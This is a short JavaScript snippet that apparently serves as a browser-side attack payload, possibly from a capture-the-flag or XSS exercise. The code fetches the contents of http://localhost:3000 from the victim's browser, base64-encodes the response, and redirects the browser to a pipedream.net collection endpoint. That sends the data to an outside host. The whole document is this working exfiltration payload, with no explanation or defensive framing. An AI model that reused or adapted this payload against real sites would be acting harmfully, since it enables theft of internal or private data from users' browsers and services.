let xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:3000");
xhr.setRequestHeader("Accept", "*/*");

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    window.location="https://envjs5kxlmfl33f.m.pipedream.net?c="+btoa(xhr.responseText)
  }};

xhr.send(null);
